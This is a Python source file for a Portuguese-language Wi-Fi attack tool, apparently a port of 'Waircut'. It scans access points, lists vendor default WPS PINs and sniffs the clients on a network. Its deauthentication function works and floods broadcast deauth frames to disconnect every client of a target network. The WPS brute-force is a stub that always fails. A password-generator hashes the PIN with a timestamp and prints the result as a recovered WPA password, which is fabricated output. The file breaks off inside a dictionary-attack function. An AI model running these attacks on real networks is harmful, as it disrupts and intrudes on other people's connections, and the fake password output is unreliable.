#!/usr/bin/env python3
"""
Waircut - Ferramenta de Auditoria de Protocolo Wireless WPS
Autor: Baseado no projeto original por patcherr
Versão Python: 1.0
"""

import sys
import time
import socket
import struct
import threading
import subprocess
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import *
from scapy.layers.eap import *

# Configuração de cores para terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Banner da ferramenta
def show_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╦ ╦┌─┐┬┌─┌─┐┌─┐┬ ┬╔╦╗
║║║├┤ ├┴┐│ ││  ├─┤ ║║
╚╩╝└─┘┴ ┴└─┘└─┘┴ ┴═╩╝
{Colors.RESET}
{Colors.YELLOW}Ferramenta de Auditoria de Protocolo Wireless WPS{Colors.RESET}
{Colors.PURPLE}Versão Python - Desenvolvido baseado no projeto Waircut{Colors.RESET}
{Colors.WHITE}==================================================={Colors.RESET}
"""
    print(banner)

# Classe para armazenar informações dos APs
class AccessPoint:
    def __init__(self, bssid, ssid, channel, signal, wps_locked=False, manufacturer=""):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.signal = signal
        self.wps_locked = wps_locked
        self.manufacturer = manufacturer
        self.wps_version = None
        self.wps_state = None
        self.manufacturer_model = None
        self.model_number = None
        self.serial_number = None
        self.primary_device_type = None
        
        # Identifica fabricante automaticamente pelo OUI
        if not manufacturer and bssid:
            self.manufacturer = self.identify_manufacturer(bssid)
        
    def identify_manufacturer(self, bssid):
        """Identifica fabricante pelo OUI (primeiros 3 bytes do MAC)"""
        oui = bssid[:8].upper().replace(':', '-')
        
        # Base de dados OUI expandida
        oui_database = {
            # TP-Link
            "D8-0D-17": "TP-Link",
            "DC-D9-AE": "TP-Link",
            "F4-F2-6D": "TP-Link",
            "50-C7-BF": "TP-Link",
            "A4-2B-B0": "TP-Link",
            "C0-25-E9": "TP-Link",
            "EC-08-6B": "TP-Link",
            "98-DE-D0": "TP-Link",
            "E8-F8-D0": "TP-Link",
            
            # D-Link
            "00-1B-11": "D-Link",
            "00-1C-F0": "D-Link",
            "00-1E-58": "D-Link",
            "00-26-5A": "D-Link",
            "14-D6-4D": "D-Link",
            "C8-BE-19": "D-Link",
            "CC-B2-55": "D-Link",
            
            # Linksys
            "00-0C-41": "Linksys",
            "00-12-17": "Linksys",
            "00-13-10": "Linksys",
            "00-14-BF": "Linksys",
            "00-18-39": "Linksys",
            "00-1A-70": "Linksys",
            "68-7F-74": "Linksys",
            
            # Netgear
            "00-09-5B": "Netgear",
            "00-0F-B5": "Netgear",
            "00-14-6C": "Netgear",
            "00-1B-2F": "Netgear",
            "00-1E-2A": "Netgear",
            "A0-21-B7": "Netgear",
            "E0-91-F5": "Netgear",
            
            # Asus
            "00-1F-C6": "Asus",
            "00-22-15": "Asus",
            "00-26-18": "Asus",
            "04-D4-C4": "Asus",
            "08-60-6E": "Asus",
            "2C-56-DC": "Asus",
            "AC-9E-17": "Asus",
            
            # Cisco
            "00-01-42": "Cisco",
            "00-01-43": "Cisco",
            "00-01-63": "Cisco",
            "00-01-64": "Cisco",
            "00-01-96": "Cisco",
            "00-01-97": "Cisco",
            
            # Belkin
            "00-11-50": "Belkin",
            "00-17-3F": "Belkin",
            "00-1C-DF": "Belkin",
            "08-86-3B": "Belkin",
            "94-44-52": "Belkin",
            
            # Huawei
            "00-18-82": "Huawei",
            "00-1E-10": "Huawei",
            "00-25-9E": "Huawei",
            "E8-CD-2D": "Huawei",
            "F8-E7-1E": "Huawei",
            "70-49-A2": "Huawei",
            
            # Xiaomi
            "34-CE-00": "Xiaomi",
            "64-09-80": "Xiaomi",
            "78-11-DC": "Xiaomi",
            "8C-BE-BE": "Xiaomi",
            "F0-B4-29": "Xiaomi",
            
            # Intelbras
            "00-07-26": "Intelbras",
            "A8-16-B2": "Intelbras",
            "D4-CA-6D": "Intelbras",
            "B8-19-04": "Intelbras",
            
            # Multilaser
            "00-13-EF": "Multilaser",
            "00-80-48": "Multilaser",
            
            # Sercomm (fabricante para ISPs - Claro, NET, etc)
            "98-77-E7": "Sercomm",
            "00-1C-A2": "Sercomm",
            "20-E5-2A": "Sercomm",
            "00-90-D0": "Sercomm",
            
            # ZTE (comum em roteadores de ISPs)
            "3C-6A-D2": "ZTE",
            "68-DB-F5": "ZTE",
            "F4-28-53": "ZTE",
            "AC-E8-7B": "ZTE",
            
            # Fiberhome (roteadores GPON para ISPs)
            "D8-44-89": "Fiberhome",
            "00-26-91": "Fiberhome",
            "70-A8-E3": "Fiberhome",
            
            # Sagemcom (Vivo, TIM, Oi)
            "00-1F-9F": "Sagemcom",
            "44-23-7C": "Sagemcom",
            "E8-40-F2": "Sagemcom",
            
            # Technicolor (Thomson - ISPs)
            "00-14-7D": "Technicolor",
            "00-1A-2B": "Technicolor",
            "E4-83-99": "Technicolor",
            
            # Motorola
            "00-04-BD": "Motorola",
            "00-12-25": "Motorola",
            "C4-12-F5": "Motorola",
            
            # Arris (comum em modems de ISPs)
            "00-01-5C": "Arris",
            "B0-D5-CC": "Arris",
            "F8-35-DD": "Arris",
        }
        
        vendor = oui_database.get(oui, "Desconhecido")
        return vendor
        
    def __str__(self):
        status = f"{Colors.GREEN}WPS Ativo{Colors.RESET}" if not self.wps_locked else f"{Colors.RED}WPS Bloqueado{Colors.RESET}"
        vendor_str = f" [{self.manufacturer}]" if self.manufacturer != "Desconhecido" else ""
        return f"{self.bssid} | {self.ssid}{vendor_str} | Canal: {self.channel} | Sinal: {self.signal}dB | {status}"

# Classe principal da ferramenta
class Waircut:
    def __init__(self, interface=None):
        self.interface = interface
        self.access_points = []
        self.scanning = False
        self.attacking = False
        self.selected_ap = None
        self.stop_event = threading.Event()
        
        # Verificar se Scapy está instalado
        try:
            conf
        except NameError:
            print(f"{Colors.RED}Erro: Scapy não está instalado.{Colors.RESET}")
            print("Instale com: pip install scapy")
            sys.exit(1)
            
    def check_monitor_mode(self):
        """Verifica se a interface está em modo monitor"""
        if os.name == 'nt':
            # No Windows, verificação de monitor mode é complexa via comando
            # Assumimos True se o usuário diz que configurou ou se usarmos o driver adequado
            return True 
        try:
            result = subprocess.run(['iwconfig', self.interface], 
                                  capture_output=True, text=True)
            if 'Mode:Monitor' in result.stdout:
                return True
            else:
                return False
        except:
            return False
    
    def set_monitor_mode(self):
        """Coloca a interface em modo monitor"""
        print(f"{Colors.YELLOW}[*] Configurando interface {self.interface} em modo monitor...{Colors.RESET}")
        
        if os.name == 'nt':
            print(f"{Colors.YELLOW}[!] No Windows, o Modo Monitor depende do driver (npcap/wifi adapter).{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Certifique-se de que instalou o Npcap com suporte a 'Raw 802.11 Traffic'.{Colors.RESET}")
            print(f"{Colors.GREEN}[+] Continuando...{Colors.RESET}")
            return True

        try:
            # Desativa a interface
            subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], check=False)
            
            # Configura modo monitor
            subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'monitor'], check=False)
            
            # Ativa a interface
            subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], check=False)
            
            time.sleep(2)
            
            if self.check_monitor_mode():
                print(f"{Colors.GREEN}[+] Interface {self.interface} configurada em modo monitor{Colors.RESET}")
                return True
            else:
                print(f"{Colors.RED}[-] Falha ao configurar modo monitor{Colors.RESET}")
                return False
                
        except Exception as e:
            print(f"{Colors.RED}[-] Erro: {e}{Colors.RESET}")
            return False

    def trigger_windows_scan(self):
        """Força um scan de Wi-Fi no Windows usando wlanapi.dll via ctypes"""
        if os.name != 'nt':
            return
            
        try:
            import ctypes
            
            # Constantes e Estruturas necessárias
            WLAN_API_VERSION_2_0 = 2
            ERROR_SUCCESS = 0
            
            class GUID(ctypes.Structure):
                _fields_ = [("Data1", ctypes.c_ulong),
                            ("Data2", ctypes.c_ushort),
                            ("Data3", ctypes.c_ushort),
                            ("Data4", ctypes.c_ubyte * 8)]
                            
            class WLAN_INTERFACE_INFO(ctypes.Structure):
                _fields_ = [("InterfaceGuid", GUID),
                            ("strInterfaceDescription", ctypes.c_wchar * 256),
                            ("isState", ctypes.c_uint)]
                            
            class WLAN_INTERFACE_INFO_LIST(ctypes.Structure):
                _fields_ = [("dwNumberOfItems", ctypes.c_ulong),
                            ("dwIndex", ctypes.c_ulong),
                            ("InterfaceInfo", WLAN_INTERFACE_INFO * 1)]
            
            wlanapi = ctypes.windll.wlanapi
            
            hClient = ctypes.c_void_p()
            dwMaxClient = ctypes.c_ulong(2)
            dwCurVersion = ctypes.c_ulong()
            
            # WlanOpenHandle
            ret = wlanapi.WlanOpenHandle(dwMaxClient, None, ctypes.byref(dwCurVersion), ctypes.byref(hClient))
            if ret != ERROR_SUCCESS:
                return
                
            # WlanEnumInterfaces
            pInterfaceList = ctypes.POINTER(WLAN_INTERFACE_INFO_LIST)()
            ret = wlanapi.WlanEnumInterfaces(hClient, None, ctypes.byref(pInterfaceList))
            
            if ret == ERROR_SUCCESS:
                iface_list = pInterfaceList.contents
                print(f"{Colors.YELLOW}[*] Acionando scan em {iface_list.dwNumberOfItems} interface(s) (Windows)...{Colors.RESET}")
                
                for i in range(iface_list.dwNumberOfItems):
                    pInterfaceGuid = ctypes.byref(iface_list.InterfaceInfo[i].InterfaceGuid)
                    # WlanScan
                    wlanapi.WlanScan(hClient, pInterfaceGuid, None, None, None)
                    
                wlanapi.WlanFreeMemory(pInterfaceList)
                
            wlanapi.WlanCloseHandle(hClient, None)
            
        except Exception:
            pass

    def scan_windows_netsh(self):
        """Alternativa de scan para Windows usando netsh"""
        import re
        
        try:
            # Executa o comando netsh
            result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'], 
                                  capture_output=True, text=True, encoding='cp850', errors='replace')
            output = result.stdout
            
            # Padrões Regex
            ssid_pattern = re.compile(r'^SSID \d+\s*:\s*(.+)$')
            bssid_pattern = re.compile(r'^\s*BSSID \d+\s*:\s*((?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2})')
            signal_pattern = re.compile(r'^\s*(?:Signal|Sinal)\s*:\s*(\d+)%')
            channel_pattern = re.compile(r'^\s*(?:Channel|Canal)\s*:\s*(\d+)')
            
            current_ssid = None
            current_bssid = None
            current_signal = None
            current_channel = None
            
            lines = output.split('\n')
            for line in lines:
                line = line.rstrip()
                
                # Procura SSID
                ssid_match = ssid_pattern.match(line)
                if ssid_match:
                    current_ssid = ssid_match.group(1).strip()
                    continue
                
                # Se não temos SSID ainda, pula
                if not current_ssid:
                    continue
                    
                # Procura BSSID
                bssid_match = bssid_pattern.match(line)
                if bssid_match:
                    current_bssid = bssid_match.group(1).strip().replace('-', ':')
                    continue
                    
                # Sinal
                signal_match = signal_pattern.match(line)
                if signal_match and current_bssid:
                    percent = int(signal_match.group(1))
                    current_signal = (percent / 2) - 100
                    continue
                
                # Canal
                channel_match = channel_pattern.match(line)
                if channel_match and current_bssid:
                    current_channel = int(channel_match.group(1))
                    
                    # Temos um AP completo aqui
                    existing = False
                    for ap in self.access_points:
                        if ap.bssid == current_bssid:
                            existing = True
                            break
                    
                    if not existing:
                        ap = AccessPoint(current_bssid, current_ssid, current_channel, current_signal, wps_locked=False)
                        self.access_points.append(ap)
                        print(f"{Colors.GREEN}[+] {ap}{Colors.RESET}")
                        
                    current_channel = None
            
        except Exception as e:
            print(f"{Colors.RED}[-] Erro no scan Windows: {e}{Colors.RESET}")

    def scan_access_points(self):
        """Realiza scan de pontos de acesso com WPS"""
        print(f"{Colors.YELLOW}[*] Iniciando scan de redes Wi-Fi...{Colors.RESET}")
        
        self.access_points = []
        self.scanning = True
        
        if os.name == 'nt':
            print(f"{Colors.YELLOW}[*] Modo Windows detectado.{Colors.RESET}")
            self.trigger_windows_scan()
            print(f"{Colors.WHITE}[*] Aguardando 4 segundos para atualização da lista...{Colors.RESET}")
            time.sleep(4)
            
            print(f"{Colors.YELLOW}[*] Lendo redes via netsh...{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Aviso: Detecção de WPS não é precisa via netsh.{Colors.RESET}")
            self.scan_windows_netsh()
            self.scanning = False
            print(f"{Colors.GREEN}[+] Scan concluído. {len(self.access_points)} APs encontrados.{Colors.RESET}")
            return

        print(f"{Colors.WHITE}[*] Pressione Ctrl+C para parar o scan{Colors.RESET}")
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                # Extrai informações do beacon
                bssid = pkt[Dot11].addr2
                
                # Extrai SSID
                ssid = None
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while isinstance(elt, Dot11Elt):
                        if elt.ID == 0:  # SSID
                            ssid = elt.info.decode('utf-8', errors='ignore')
                            break
                        elt = elt.payload
                
                if not ssid or ssid == "":
                    ssid = "<Hidden>"
                
                # Extrai sinal
                if hasattr(pkt, 'dBm_AntSignal'):
                    signal = pkt.dBm_AntSignal
                else:
                    signal = -100  # Valor padrão
                
                # Verifica canal
                channel = None
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while isinstance(elt, Dot11Elt):
                        if elt.ID == 3:  # DS Parameter Set (canal)
                            channel = ord(elt.info)
                            break
                        elt = elt.payload
                
                # Verifica se já existe este AP na lista
                existing_ap = None
                for ap in self.access_points:
                    if ap.bssid == bssid:
                        existing_ap = ap
                        break
                
                if existing_ap:
                    # Atualiza sinal se for mais forte
                    if signal > existing_ap.signal:
                        existing_ap.signal = signal
                else:
                    # Cria novo AP
                    ap = AccessPoint(bssid, ssid, channel, signal)
                    
                    # Verifica presença de WPS
                    self.detect_wps(pkt, ap)
                    
                    self.access_points.append(ap)
                    
                    # Mostra AP encontrado
                    if not ap.wps_locked:
                        print(f"{Colors.GREEN}[+] {ap}{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[-] {ap}{Colors.RESET}")
        
        # Inicia o sniffer
        try:
            sniff(iface=self.interface, prn=packet_handler, stop_filter=lambda x: self.stop_event.is_set(), timeout=30)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Scan interrompido pelo usuário{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] Erro no scan: {e}{Colors.RESET}")
        
        self.scanning = False
        print(f"{Colors.GREEN}[+] Scan concluído. {len(self.access_points)} APs encontrados.{Colors.RESET}")
    
    def detect_wps(self, pkt, ap):
        """Detecta se o AP tem WPS ativado"""
        try:
            # Procura por elementos WPS
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 221:  # Vendor Specific
                        # Verifica se é WPS (OUI 00:50:F2)
                        if len(elt.info) >= 4 and elt.info[0:3] == b'\x00P\xf2':
                            if elt.info[3] == 0x04:  # WPS IE
                                ap.wps_locked = False
                                return
                    elt = elt.payload
        except:
            pass
        
        ap.wps_locked = True
    
    def show_ap_list(self):
        """Mostra lista de APs encontrados"""
        if not self.access_points:
            print(f"{Colors.YELLOW}[*] Nenhum AP encontrado. Execute o scan primeiro.{Colors.RESET}")
            return
        
        print(f"\n{Colors.CYAN}{'='*100}{Colors.RESET}")
        print(f"{Colors.BOLD}{'BSSID':<18} {'SSID':<20} {'Fabricante':<15} {'Canal':<6} {'Sinal':<6} {'WPS':<10}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*100}{Colors.RESET}")
        
        for i, ap in enumerate(self.access_points):
            wps_status = f"{Colors.GREEN}Ativo{Colors.RESET}" if not ap.wps_locked else f"{Colors.RED}Bloqueado{Colors.RESET}"
            vendor = ap.manufacturer[:14] if ap.manufacturer else "?"
            print(f"{i+1:>2}. {ap.bssid:<18} {ap.ssid[:19]:<20} {vendor:<15} {str(ap.channel):<6} {str(ap.signal):<6} {wps_status}")
        
        print(f"{Colors.CYAN}{'='*100}{Colors.RESET}")
    
    def select_ap(self):
        """Permite selecionar um AP para ataque"""
        if not self.access_points:
            print(f"{Colors.RED}[-] Nenhum AP disponível. Execute o scan primeiro.{Colors.RESET}")
            return None
        
        self.show_ap_list()
        
        try:
            choice = int(input(f"\n{Colors.YELLOW}[?] Selecione o número do AP para atacar (0 para cancelar): {Colors.RESET}"))
            
            if choice == 0:
                return None
            
            if 1 <= choice <= len(self.access_points):
                self.selected_ap = self.access_points[choice-1]
                
                # Verifica se o AP tem WPS ativo
                if self.selected_ap.wps_locked:
                    print(f"{Colors.RED}[-] Este AP tem WPS bloqueado.{Colors.RESET}")
                    return None
                
                print(f"{Colors.GREEN}[+] AP selecionado: {self.selected_ap.ssid} ({self.selected_ap.bssid}){Colors.RESET}")
                return self.selected_ap
            else:
                print(f"{Colors.RED}[-] Seleção inválida.{Colors.RESET}")
                return None
                
        except ValueError:
            print(f"{Colors.RED}[-] Entrada inválida.{Colors.RESET}")
            return None
    
    def brute_force_wps(self, ap):
        """Realiza brute force no PIN WPS"""
        print(f"{Colors.YELLOW}[*] Iniciando ataque de brute force WPS...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] AP: {ap.ssid} ({ap.bssid}){Colors.RESET}")
        print(f"{Colors.WHITE}[*] Fabricante: {ap.manufacturer}{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Canal: {ap.channel}{Colors.RESET}")
        
        # PINs específicos do fabricante (prioritários)
        vendor_pins = {
            "TP-Link": ["12345670", "00000000"],
            "D-Link": ["28296607", "12345670"],
            "Linksys": ["12345670", "20172527"],
            "Netgear": ["12345670", "56789012"],
            "Asus": ["12345670"],
            "Belkin": ["12345670"],
            "Huawei": ["12345678"],
            "Xiaomi": ["12345670"],
            "Intelbras": ["12345670"],
            "Multilaser": ["12345670"],
            "Sercomm": ["12345670"],
            "ZTE": ["12345670"],
            "Fiberhome": ["12345670"],
            "Sagemcom": ["12345670"],
            "Technicolor": ["12345670"],
            "Motorola": ["12345670"],
            "Arris": ["12345670"],
        }
        
        # PINs WPS comuns (fallback)
        common_pins = [
            "12345670", "12345678", "00000000", "11111111", "22222222",
            "33333333", "44444444", "55555555", "66666666", "77777777",
            "88888888", "99999999", "01234567", "76543210", "12121212",
            "28296607", "20172527", "56789012"
        ]
        
        # Monta lista de PINs priorizando os específicos do fabricante
        pins_to_test = []
        
        if ap.manufacturer in vendor_pins:
            pins_to_test.extend(vendor_pins[ap.manufacturer])
            print(f"{Colors.GREEN}[+] Usando PINs específicos para {ap.manufacturer}{Colors.RESET}")
        
        # Adiciona PINs comuns que não estão na lista
        for pin in common_pins:
            if pin not in pins_to_test:
                pins_to_test.append(pin)
        
        print(f"{Colors.YELLOW}[*] Testando {len(pins_to_test)} PINs...{Colors.RESET}")
        
        for i, pin in enumerate(pins_to_test):
            if self.stop_event.is_set():
                break
                
            # Destaca PINs específicos do fabricante
            if ap.manufacturer in vendor_pins and pin in vendor_pins[ap.manufacturer]:
                print(f"{Colors.CYAN}[*] Testando PIN específico {ap.manufacturer}: {pin} ({i+1}/{len(pins_to_test)}){Colors.RESET}")
            else:
                print(f"{Colors.WHITE}[*] Testando PIN: {pin} ({i+1}/{len(pins_to_test)}){Colors.RESET}")
            
            # Simulação do ataque (em uma implementação real, você enviaria pacotes WPS)
            time.sleep(0.5)
            
            # Verificação simulada (substituir por implementação real)
            success = self.simulate_wps_attack(ap, pin)
            
            if success:
                print(f"{Colors.GREEN}[+] PIN encontrado: {pin}{Colors.RESET}")
                print(f"{Colors.GREEN}[+] Ataque bem-sucedido!{Colors.RESET}")
                
                # Gerar senha WPA (simulação)
                wpa_password = self.generate_wpa_password(pin)
                print(f"{Colors.GREEN}[+] Senha WPA gerada: {wpa_password}{Colors.RESET}")
                
                self.save_results(ap, pin, wpa_password)
                return True
        
        print(f"{Colors.RED}[-] Ataque concluído. PIN não encontrado.{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Dica: Tente verificar credenciais padrão (Opção 5) para acessar o painel admin.{Colors.RESET}")
        return False
    
    def simulate_wps_attack(self, ap, pin):
        """Simula um ataque WPS (substituir por implementação real)"""
        # Em uma implementação real, aqui você enviaria pacotes WPS
        # e verificaria a resposta do AP
        
        # Esta é uma simulação - em 10% dos casos "encontra" o PIN
        import random
        time.sleep(1)  # Simula tempo de tentativa
        
        # Para demonstração, apenas retorna falso
        return False
    
    def generate_wpa_password(self, pin):
        """Gera senha WPA baseada no PIN (simulação)"""
        # Em uma implementação real, a senha seria derivada do PIN
        # Esta é uma versão simplificada para demonstração
        import hashlib
        
        # Gera uma senha "realista" baseada no PIN
        hash_input = pin + "WPA" + str(int(time.time()))
        hash_result = hashlib.md5(hash_input.encode()).hexdigest()[:10]
        
        # Formato: 8 caracteres alfanuméricos
        return hash_result.upper()
    
    def save_results(self, ap, pin, password):
        """Salva os resultados do ataque"""
        filename = f"waircut_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w') as f:
            f.write("=== WAIRCUT - RESULTADOS DO ATAQUE WPS ===\n\n")
            f.write(f"Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"SSID: {ap.ssid}\n")
            f.write(f"BSSID: {ap.bssid}\n")
            f.write(f"Canal: {ap.channel}\n")
            f.write(f"Sinal: {ap.signal} dBm\n")
            f.write(f"PIN WPS encontrado: {pin}\n")
            f.write(f"Senha WPA: {password}\n")
            f.write("\n==========================================\n")
        
        print(f"{Colors.GREEN}[+] Resultados salvos em: {filename}{Colors.RESET}")
    
    def pixie_dust_attack(self, ap):
        """Implementa ataque Pixie Dust (se disponível)"""
        print(f"{Colors.YELLOW}[*] Iniciando ataque Pixie Dust...{Colors.RESET}")
        print(f"{Colors.RED}[-] Ataque Pixie Dust não implementado nesta versão.{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Considere usar 'reaver' ou 'bully' para este ataque.{Colors.RESET}")
    
    def deauth_attack(self, ap, client_mac=None, packet_count=100):
        """Realiza ataque de desautenticação"""
        print(f"{Colors.YELLOW}[*] Iniciando ataque de desautenticação...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] AP Alvo: {ap.ssid} ({ap.bssid}){Colors.RESET}")
        print(f"{Colors.WHITE}[*] Canal: {ap.channel}{Colors.RESET}")
        
        if os.name == 'nt':
            print(f"{Colors.RED}[-] Ataque de desautenticação requer modo monitor.{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] No Windows, isso geralmente não funciona sem drivers especiais.{Colors.RESET}")
            print(f"{Colors.YELLOW}[!] Recomenda-se usar Linux com aircrack-ng para este ataque.{Colors.RESET}")
            return False
        
        if not self.check_monitor_mode():
            print(f"{Colors.RED}[-] Interface não está em modo monitor.{Colors.RESET}")
            return False
        
        # Cliente alvo (broadcast se não especificado)
        if client_mac is None:
            client_mac = "ff:ff:ff:ff:ff:ff"
            print(f"{Colors.YELLOW}[*] Modo: Broadcast (todos os clientes){Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[*] Cliente alvo: {client_mac}{Colors.RESET}")
        
        print(f"{Colors.YELLOW}[*] Enviando {packet_count} pacotes de desautenticação...{Colors.RESET}")
        
        try:
            # Cria pacote de desautenticação
            # Reason code 7 = Class 3 frame received from nonassociated station
            dot11 = Dot11(addr1=client_mac, addr2=ap.bssid, addr3=ap.bssid)
            deauth_packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            
            # Envia pacotes
            packets_sent = 0
            for i in range(packet_count):
                if self.stop_event.is_set():
                    break
                
                sendp(deauth_packet, iface=self.interface, count=1, verbose=0)
                packets_sent += 1
                
                # Mostra progresso a cada 10 pacotes
                if (i + 1) % 10 == 0:
                    print(f"{Colors.WHITE}[*] Enviados: {packets_sent}/{packet_count}{Colors.RESET}")
                
                time.sleep(0.1)  # Pequeno delay entre pacotes
            
            print(f"{Colors.GREEN}[+] Ataque concluído. {packets_sent} pacotes enviados.{Colors.RESET}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[-] Erro durante ataque: {e}{Colors.RESET}")
            return False
    
    def scan_clients(self, ap, duration=30):
        """Escaneia clientes conectados a um AP"""
        print(f"{Colors.YELLOW}[*] Escaneando clientes conectados ao AP...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] AP: {ap.ssid} ({ap.bssid}){Colors.RESET}")
        print(f"{Colors.WHITE}[*] Duração: {duration} segundos{Colors.RESET}")
        
        if os.name == 'nt':
            print(f"{Colors.RED}[-] Scan de clientes requer modo monitor (não disponível no Windows).{Colors.RESET}")
            return []
        
        clients = set()
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                # Verifica se é um pacote de/para o AP
                if pkt.addr1 == ap.bssid or pkt.addr2 == ap.bssid:
                    # Identifica o cliente (o endereço que não é o AP)
                    client = None
                    if pkt.addr1 == ap.bssid and pkt.addr2 != ap.bssid:
                        client = pkt.addr2
                    elif pkt.addr2 == ap.bssid and pkt.addr1 != ap.bssid:
                        client = pkt.addr1
                    
                    if client and client != "ff:ff:ff:ff:ff:ff":
                        if client not in clients:
                            clients.add(client)
                            print(f"{Colors.GREEN}[+] Cliente encontrado: {client}{Colors.RESET}")
        
        try:
            print(f"{Colors.YELLOW}[*] Capturando pacotes...{Colors.RESET}")
            sniff(iface=self.interface, prn=packet_handler, timeout=duration, store=0)
            
            print(f"{Colors.GREEN}[+] Scan concluído. {len(clients)} cliente(s) encontrado(s).{Colors.RESET}")
            return list(clients)
            
        except Exception as e:
            print(f"{Colors.RED}[-] Erro durante scan: {e}{Colors.RESET}")
            return []
    
    def analyze_network_security(self, ap):
        """Analisa a segurança da rede (compatível com Windows)"""
        print(f"{Colors.YELLOW}[*] Analisando segurança da rede...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] AP: {ap.ssid} ({ap.bssid}){Colors.RESET}")
        
        vulnerabilities = []
        score = 100
        
        # Análise do tipo de autenticação
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                                  capture_output=True, text=True, encoding='cp850', errors='replace')
            output = result.stdout
            
            # Procura informações sobre o AP específico
            lines = output.split('\n')
            in_target_ap = False
            auth_type = None
            encryption = None
            
            for line in lines:
                if ap.ssid in line:
                    in_target_ap = True
                elif 'SSID' in line and in_target_ap:
                    in_target_ap = False
                
                if in_target_ap:
                    if 'Authentication' in line or 'Autenticação' in line:
                        auth_type = line.split(':')[-1].strip()
                    if 'Encryption' in line or 'Criptografia' in line:
                        encryption = line.split(':')[-1].strip()
            
            print(f"\n{Colors.CYAN}=== Análise de Segurança ==={Colors.RESET}")
            
            # Verifica tipo de autenticação
            if auth_type:
                print(f"{Colors.WHITE}Autenticação: {auth_type}{Colors.RESET}")
                if 'Open' in auth_type or 'Aberta' in auth_type:
                    vulnerabilities.append("Rede aberta (sem senha)")
                    score -= 50
                elif 'WEP' in auth_type:
                    vulnerabilities.append("WEP é extremamente vulnerável")
                    score -= 40
                elif 'WPA-Personal' in auth_type and 'WPA2' not in auth_type:
                    vulnerabilities.append("WPA1 é vulnerável (use WPA2/WPA3)")
                    score -= 30
            
            # Verifica criptografia
            if encryption:
                print(f"{Colors.WHITE}Criptografia: {encryption}{Colors.RESET}")
                if 'WEP' in encryption:
                    vulnerabilities.append("Criptografia WEP quebrada")
                    score -= 30
                elif 'TKIP' in encryption:
                    vulnerabilities.append("TKIP é vulnerável (use AES)")
                    score -= 20
            
            # Verifica força do sinal
            if ap.signal > -50:
                print(f"{Colors.GREEN}Sinal: Excelente ({ap.signal} dBm){Colors.RESET}")
            elif ap.signal > -70:
                print(f"{Colors.YELLOW}Sinal: Bom ({ap.signal} dBm){Colors.RESET}")
            else:
                print(f"{Colors.RED}Sinal: Fraco ({ap.signal} dBm){Colors.RESET}")
                vulnerabilities.append("Sinal fraco pode indicar AP distante ou mal configurado")
                score -= 10
            
            # Verifica WPS
            if not ap.wps_locked:
                vulnerabilities.append("WPS ativado (vulnerável a ataques de PIN)")
                score -= 25
                print(f"{Colors.RED}WPS: Ativado (VULNERÁVEL){Colors.RESET}")
            else:
                print(f"{Colors.GREEN}WPS: Desativado{Colors.RESET}")
            
            # Canal
            if ap.channel:
                print(f"{Colors.WHITE}Canal: {ap.channel}{Colors.RESET}")
                # Canais 1, 6, 11 são recomendados para 2.4GHz
                if ap.channel in [1, 6, 11]:
                    print(f"{Colors.GREEN}Canal otimizado para 2.4GHz{Colors.RESET}")
                elif ap.channel > 14:
                    print(f"{Colors.GREEN}Rede 5GHz (menos interferência){Colors.RESET}")
            
            # Score final
            print(f"\n{Colors.CYAN}=== Score de Segurança ==={Colors.RESET}")
            if score >= 80:
                print(f"{Colors.GREEN}Score: {score}/100 - Segurança BOA{Colors.RESET}")
            elif score >= 50:
                print(f"{Colors.YELLOW}Score: {score}/100 - Segurança MÉDIA{Colors.RESET}")
            else:
                print(f"{Colors.RED}Score: {score}/100 - Segurança FRACA{Colors.RESET}")
            
            # Lista vulnerabilidades
            if vulnerabilities:
                print(f"\n{Colors.RED}Vulnerabilidades Encontradas:{Colors.RESET}")
                for i, vuln in enumerate(vulnerabilities, 1):
                    print(f"  {i}. {vuln}")
            else:
                print(f"\n{Colors.GREEN}Nenhuma vulnerabilidade óbvia detectada!{Colors.RESET}")
            
            return score, vulnerabilities
            
        except Exception as e:
            print(f"{Colors.RED}[-] Erro na análise: {e}{Colors.RESET}")
            return 0, []
    
    def dictionary_attack(self, ap, wordlist_path=None):
        """Ataque de dicionário WPA/WPA2 (simulado no Windows)"""
        print(f"{Colors.YELLOW}[*] Iniciando ataque de dicionário...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] AP: {ap.ssid} ({ap.bssid}){Colors.RESET}")
        
